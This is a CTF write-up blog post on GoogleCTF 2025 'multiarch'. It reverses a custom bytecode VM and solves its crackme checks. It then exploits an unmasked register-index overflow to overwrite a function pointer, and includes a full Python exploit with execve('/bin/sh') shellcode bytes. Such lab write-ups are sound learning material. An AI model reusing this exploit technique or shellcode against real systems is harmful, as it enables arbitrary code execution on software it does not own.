---
date: 2025-06-29T23:55:07+02:00
# description: ""
# image: ""
lastmod: 2025-06-30
showTableOfContents: true
tags: ["pwn", "rev", "writeup", "vm"]
title: "GoogleCTF 2025 | multiarch"
type: "post"
---

## Overview

This weekend, I played GoogleCTF to try out some of the challenges, since this CTF is highly rated on CTFTime.
The first challenges I solved were multiarch part 1 & 2, which I found to be the most interesting, 
even though they were relatively easy compared to the rest of the CTF. 

First part was a reverse engineering challenge, which isn’t my main category, but I do it because binary exploitation
usually requires some reversing in almost every challenge. This time, it was impossible for me to do the binary exploitation part without
reversing it first. The binary was a "virtual machine"-type challenge — an interpreter for custom bytecode provided with the challenge
in a file called `crackme.masm`.

## Reversing Virtual Machine

The `main` function was just a series of calls to other functions for loading the file, VM initialization, execution, and destruction.
I created a structure for the VM and its segments based on the other functions to make reversing it easier.
```c
typedef struct {
    void *data;
    size_t size;
} Seg;

typedef struct __attribute__((packed))
{
    uint8_t type;
    uint16_t offset;
    uint16_t size;
} SegInfo;

typedef struct {
    Seg seg1;
    Seg seg2;
    Seg seg3;
} VMSegs;

typedef struct __attribute__((packed)) {
    void *data;
    uint32_t vaddr;
} MemSeg;

typedef struct __attribute__((packed)) {
    void *code;
    void *data;
    void *stack;
    uint8_t *bitmask;
    uint64_t size;
    char *(*getflag)();
    uint8_t err_flag, mode_flag, FLAGS;
    uint32_t PC, SP, RA, RB, RC, RD;
    MemSeg add_mems[5];
    uint8_t mems_cnt;
} VM;

int main(int argc, char **argv)
{
    VMSegs *vmsegs; // rax
    VMSegs *vmsegs_; // rbp
    VM *vm; // rbx

    setbuf(stdin, 0LL);
    setbuf(stdout, 0LL);
    setbuf(stderr, 0LL);
    if ( argc <= 1 )
    {
        fprintf(stderr, "[E] usage: %s [path to .masm file]\n", *argv);
        return 2;
    }
    else
    {
        fwrite("[I] initializing multiarch emulator\n", 1uLL, 0x24uLL, stderr);
        vmsegs = load_file(argv[1]);
        vmsegs_ = vmsegs;
        if ( vmsegs )
        {
            vm = vm_init(vmsegs);
            fwrite("[I] executing program\n", 1uLL, 0x16uLL, stderr);
            while ( vm_execute(vm) )
                ;
            if ( vm->err_flag )
            {
                fwrite("[E] execution failed\n", 1uLL, 0x15uLL, stderr);
                vm_error(vm, 1);
            }
            else
            {
                fwrite("[I] done!\n", 1uLL, 0xAuLL, stderr);
            }
            vm_destroy(vm);
            clear_vmsegs(vmsegs_);
            return 0;
        }
        else
        {
            fwrite("[E] couldn't load multiarch program\n", 1uLL, 0x24uLL, stderr);
            return 1;
        }
    }
}
```

### File Structure and VM Initialization

In previous VM challenges I did, files contained just bytecode for the VM, but this time the file had some structure.
It starts with a header check for the `MASM` string, followed by segment information. The `read_seg` function reads the structure for VM segment data
from the file at the offset given as the second argument, and based on that data, it allocates memory for the segment and loads it in.
```c
VMSegs * load_file(const char *fname)
{
    FILE *fptr; // rax
    FILE *fptr_; // rbx
    VMSegs *vmsegs; // rbp
    int *errno_ptr; // rax
    char *errstr; // rax
    int *errno_ptr_; // rax
    char *errstr_; // rax
    char header[16]; // [rsp+0h] [rbp-38h] BYREF
    uint64_t canary; // [rsp+18h] [rbp-20h]

    canary = __readfsqword(0x28u);
    fptr = fopen(fname, "r");
    fptr_ = fptr;
    if ( !fptr )
    {
        errno_ptr = __errno_location();
        errstr = strerror(*errno_ptr);
        fprintf(stderr, "[E] couldn't open file %s - %s\n", fname, errstr);
        return 0LL;
    }
    memset(header, 0, sizeof(header));
    if ( fread(header, 1uLL, 4uLL, fptr) != 4 )
    {
        errno_ptr_ = __errno_location();
        errstr_ = strerror(*errno_ptr_);
        fprintf(stderr, "[E] couldn't read magic - %s\n", errstr_);
LABEL_9:
        fclose(fptr_);
        return 0LL;
    }
    if ( strncmp(header, "MASM", 4uLL) )
    {
        fwrite("[E] bad magic\n", 1uLL, 0xEuLL, stderr);
        goto LABEL_9;
    }
    vmsegs = (VMSegs *)calloc(1uLL, 0x30uLL);
    if ( !read_seg(vmsegs, 4uLL, fptr_) || !read_seg(vmsegs, 9uLL, fptr_) || !read_seg(vmsegs, 14uLL, fptr_) )
    {
        if ( vmsegs )
            clear_vmsegs(vmsegs);
        goto LABEL_9;
    }
    return vmsegs;
}
```
The VM is initialized based on the loaded segments, which represent `code`, `data`, `stack`, and `bitmask`.
The bitmask segment is used to determine whether an instruction will be stack-based or register-based, since this VM has
those two modes of executing instructions. A useful detail for the binary exploitation part that comes later is that
`code` and `data` are loaded into mmap-ed memory with **rwx** permissions, so we can put shellcode there and,
if we manage to get any arbitrary jump or call, we can execute it.
```c
VM * vm_init(VMSegs *vmsegs)
{
    VM *vm; // rbx
    void *code; // r14
    void *data; // r13
    uint8_t *bitmask; // r12
    size_t size; // r13

    vm = (VM *)calloc(1uLL, 0x88uLL);
    code = mmap(0LL, 0x1000uLL, 7, 33, 0, 0LL);
    vm->code = code;
    data = mmap(0LL, 0x1000uLL, 7, 33, 0, 0LL);
    vm->data = data;
    vm->stack = mmap(0LL, 0x1000uLL, 7, 33, 0, 0LL);
    bitmask = (uint8_t *)calloc(1uLL, vmsegs->seg3.size);
    vm->bitmask = bitmask;
    vm->getflag = getflag;
    memcpy(code, vmsegs->seg1.data, vmsegs->seg1.size);
    memcpy(data, vmsegs->seg2.data, vmsegs->seg2.size);
    size = vmsegs->seg3.size;
    memcpy(bitmask, vmsegs->seg3.data, vmsegs->seg3.size);
    vm->size = size;
    vm->PC = 0x1000;
    vm->SP = 0x8F00;
    return vm;
}
```

### Execution and 'virtual' address

The VM executes instructions based on bits from the `bitmask` segment. In both types of instructions,
there is a special instruction for system calls, used to execute functions like input, output, random, and similar operations.
The `PRINT_FLAG` syscall is used to read the flag from the environment by calling `vm->getflag`, which points to the function responsible for that.
```c
bool vm_get_pc_bit(VM *vm)
{
    uint32_t PC; // edx
    signed int read_ind; // eax
    int byte; // eax

    PC = vm->PC;
    read_ind = PC - 0xFF9;
    if ( (int)(PC - 0x1000) >= 0 )
        read_ind = vm->PC - 0x1000;
    byte = vm->bitmask[read_ind >> 3];
    return _bittest(&byte, PC & 7);
}

bool vm_execute(VM *vm)
{
    bool pc_bit; // al

    pc_bit = vm_get_pc_bit(vm);
    if ( !pc_bit )
        return vm_execute_stack(vm);
    if ( pc_bit )
        return vm_execute_reg(vm);
    fwrite("[E] nice qubit\n", 1uLL, 0xFuLL, stderr);
    return 0;
}

/*
SYSCALLS:
0 - READ_INT - reading integer from stdin
1 - READ_MEM - reading bytes from stdin
2 - WRITE_MEM - writing bytes to stdout
3 - SRAND - calling srand()
4 - RAND - generating random number with rand()
5 - PRINT_FLAG - printing flag from env
6 - EXPAND_MEM - allocating additional memory
*/
```
Addressing something in the VM uses a kind of virtual addressing, not direct offsetting.
There’s a function for parsing a virtual address to a real address outside the VM.
```c
void * vm_parse_addr(VM *vm, uint32_t addr, size_t size)
{
    size_t end; // rax
    uint8_t mems_cnt; // di
    void *result; // rax
    uint32_t *p_vaddr; // rcx
    size_t end_; // r10
    uint32_t vaddr; // edx

    if ( addr <= 0xFFF )
        goto LABEL_7;
    end = size + addr;
    if ( end <= 0x1FFF )
        return (char *)vm->code + addr - 0x1000;
    if ( addr <= 0x1FFF )
        goto LABEL_7;
    if ( end <= 0x2FFF )
        return (char *)vm->data + addr - 0x2000;
    if ( addr > 0x7FFF && end <= 0x8FFF )
        return (char *)vm->stack + addr - 0x8000;
    LABEL_7:
    mems_cnt = vm->mems_cnt;
    result = 0LL;
    if ( mems_cnt )
    {
        p_vaddr = &vm->add_mems[0].vaddr;
        end_ = size + addr;
        do
        {
        vaddr = *p_vaddr;
        if ( addr >= *p_vaddr && end_ < vaddr + 0x200 )
            return (char *)vm->add_mems[(int)result].data + addr - vaddr;
        *(uint32_t*)(&result) = (uint32_t)result + 1;
        p_vaddr += 3;
        }
        while ( (uint32_t)result != mems_cnt );
        return 0LL;
    }
    return result;
}
```
I uploaded the complete file containing the decompiled code from IDA here: [decompiled.c](/blog/scripts/multiarch/decompiled.c).
Based on that decompilation, I wrote a disassembler for the VM in Python to produce assembly-like code from the provided file.
The disassembler script is available here: [disasm.py](/blog/scripts/multiarch/disasm.py).

### Solving challenge

There are three parts (checks) in the `crackme.masm` challenge.
The first one is very easy to pass; it could be done even without reversing the whole VM, just by using a debugger.
It just reads an integer from stdin and performs XOR and addition operations to compute a value.
```
0x1000 : PUSHB 0x4b
0x1005 : PUSH 0x2000
0x100a : PUSHB 0x2
0x100f : STACK_SYSCALL -- write message
0x1014 : PUSHB 0x2b
0x1019 : PUSH 0x20ad
0x101e : PUSHB 0x2
0x1023 : STACK_SYSCALL -- write message
0x1028 : PUSHB 0x0
0x102d : STACK_SYSCALL -- read int
0x1032 : PUSHW 0x1337
0x1037 : PUSHW 0x539
0x103c : PUSH 0x8675309
0x1041 : STACK_XOR
0x1046 : STACK_ADD
0x104b : PUSH 0xaaaaaaaa
0x1050 : STACK_CMP
0x1055 : JNE 0x110b

(input + (0x8675309 ^ 0x13370539)) == 0xaaaaaaaa

input = 0xaaaaaaaa - (0x8675309 ^ 0x13370539) = 0x8f5a547a
```
The second part is a little bit more complex. It loads some bytes from stdin and calls a function.
The function iterates over them, performing multiplication and XORing the higher parts of the product to compute a value.
```
0x105a : MOV RA, 0x2
0x105f : MOV RB, 0x20d8
0x1064 : MOV RC, 0x1e
0x1069 : SYSCALL -- write message
0x106a : SUB SP, 32
0x1070 : MOV RB, SP
0x1071 : PUSH RB
0x1072 : MOV RC, 0x20
0x1077 : MOV RA, 0x1
0x107c : SYSCALL -- read 32 chars
0x107d : POP RA
0x107e : MOV RB, 0x20
0x1083 : CALL 0x111c
0x1088 : CMP RA, 0x7331
0x108d : JNE 0x110b

func1(buf, size) == 0x7331
ceil((0x7331 << 32) / 3405691582) = 0x9146

0x111c : MOV RC, RA
0x111d : ADD RA, RB
0x111f : PUSH RA
0x1120 : MOV RB, 0x0
0x1125 : MOV RD, [RC]
0x1127 : MUL RD, 3405691582
0x112d : XOR RB, RD
0x112f : POP RA
0x1130 : PUSH RA
0x1131 : CMP RA, RC
0x1132 : JE 0x1142
0x1137 : ADD RC, 4
0x113d : JMP 0x1125
0x1142 : MOV RA, RB
0x1143 : RETN 0x1

def func1(buf, size):
    res = 0
    for i = 0..size, 4:
        res ^= (le(buf[i:i+4]) * 3405691582) >> 32
    return res

sending bytes b'\x46\x91' will pass the check
```
The third part is the most complex. It seeds `srand` with an inputted integer and tries to get
a random number to match a specific value. This part requires a bit of bruteforcing, which I handled in C.
```
0x1092 : MOV RA, 0x0
0x1097 : PUSHB 0x5a
0x109c : PUSH 0x20f6
0x10a1 : PUSHB 0x2
0x10a6 : STACK_SYSCALL -- write message
0x10ab : SYSCALL -- read int
0x10ac : MOV RB, RA
0x10ad : MOV RA, 0x3
0x10b2 : SYSCALL -- srand
0x10b3 : MOV RC, 0x0
0x10b8 : CALL 0x1145
0x10bd : PUSH 0xffffff
0x10c2 : PUSH RA
0x10c3 : STACK_AND
0x10c8 : PUSH 0xc0ffee
0x10cd : STACK_CMP
0x10d2 : JE 0x10ec
0x10d7 : ADD RC, 1
0x10dd : CMP RC, 0xa
0x10e2 : JE 0x110b
0x10e7 : JMP 0x10b8

srand(input)
for i in 0..10:
    res = func2() & 0xffffff
    if res == 0xc0ffee:
        return True
return False

0x10ec : MOV RC, 0x39
0x10f1 : MOV RB, 0x2074
0x10f6 : MOV RA, 0x2
0x10fb : SYSCALL
0x10fc : PUSHB 0x5
0x1101 : STACK_SYSCALL -- print flag
0x1106 : JMP 0x111b
```
```c
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>

uint32_t get_rand() {
    uint32_t res = (uint16_t)rand();
    res |= rand() << 16;
    return res;
}

int main() {
    int i = 0;
    while(1) {
        srand(i);
        for(int j = 0; j < 10; j++) {
            uint32_t r = get_rand();
            r = (r ^ 0x133700 ^ 0xf2f2f2f2) & 0xffffff;
            if(r == 0xc0ffee) {
                printf("%d\n", i);
                return 0;
            }
        }
        i++;
    }
    return 0;
}
```
And that was my solution for the reverse engineering challenge in **multiarch**.

## VM exploitation

### Finding the vulnerability

Finding the vulnerability in this one was a bit tricky, but what actually took me the most time was making an assumption.
When I was looking at the part of the code handling register operations — specifically the addition operation — I saw it was safe;
there wasn’t any buffer overflow for register indexing. I assumed it was the same for all operations and skipped checking the others.
That was my mistake. When I came back to that part later, I noticed that there was no `& 3` mask for the other operations (XOR and SUB),
which means there’s an overflow there.
```c
case 0x20u:
    v11 = vm->PC;
    vm->PC = v11 + 1;
    ok = vm_load_byte(vm, v11, &result);
    if ( ok )
        *(&vm->RA + ((((uint8_t)result >> 4) - 1) & 3)) += *(&vm->RA + (((uint8_t)result - 1) & 3));
    else
        vm->err_flag = 1;
    return ok;
...
case 0x30u:
    PC__ = vm->PC;
    vm->PC = PC__ + 1;
    ok = vm_load_byte(vm, PC__, &result);
    if ( ok )
        *(&vm->RA + (uint8_t)(((uint8_t)result >> 4) - 1)) -= *(&vm->RA + (uint8_t)((result & 0xF) - 1));
    else
        vm->err_flag = 1;
    return ok;
```
### Exploitation

After finding the vulnerability, the exploitation part was relatively easy. My strategy was to
allocate some additional memory using the `EXPAND_MEM` syscall, getting a heap address located after the registers array.
Then, I used the overflow to modify that address to point to the VM structure, which is also on the heap.
Accessing the added memory would now access the VM structure, which could be used to overwrite the `getflag` argument in the struct with the `data` segment address.
By placing shellcode in the `data` segment and calling `PRINT_FLAG`, we could get a shell.

I also created a `struct.c` file and compiled it to `struct.o` so I could load DWARF struct symbols in GDB to make
debugging easier.
```c
#include <stdint.h>

struct __attribute__((packed)) MemSeg {
    void *data;
    uint32_t vaddr;
};

struct __attribute__((packed)) VM {
    void *mem1;
    void *mem2;
    void *mem3;
    void *mem4;
    uint64_t size;
    char *(*getflag)();
    uint8_t err_flag, mode_flag, FLAGS;
    uint32_t PC, SP, RA, RB, RC, RD;
    struct MemSeg add_mems[5];
    uint8_t mems_cnt;
};

struct VM vm;

int main() {
    return 0;
}

/*
file multiarch
add-symbol-file structs.o 0
brva 0x1333
c
set $vm = (struct VM*)$rax
c
*/
```

I wrote an assembler class in Python to make it easier and more understandable to create a VM file.
This is the exploit file, which is enough to get a shell and read the flag from the filesystem.
The full exploit file can be found here: [exploit.py](/blog/scripts/multiarch/exploit.py).
```py
asmb = Assembler()

asmb.stack_push(0)
asmb.stack_push_byte(6)
asmb.stack_syscall() # EXPAND_MEM
asmb.xor_imm(5, 0x370) # chaning address to point to VM*
asmb.ldr_imm(2, 0xa008) # reading lower part of data address
asmb.str_imm(2, 0xa028) # storing lower part of data address at getflag
asmb.ldr_imm(2, 0xa00c) # reading higher part of data address
asmb.str_imm(2, 0xa02c) # storing higher part of data address at getflag
asmb.stack_push_byte(5)
asmb.stack_syscall() # PRINT_FLAG
asmb.halt()

magic = b"MASM"
code = asmb.code
bssdata = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
archmask = bytes(asmb.archmask)

payload = flat(
    magic,
    make_segment(1, 19, len(code)),
    make_segment(2, 19 + len(code), len(bssdata)),
    make_segment(3, 19 + len(code) + len(bssdata), len(archmask)),
    code, bssdata, archmask
)

open("exploit.masm", "wb").write(payload)
```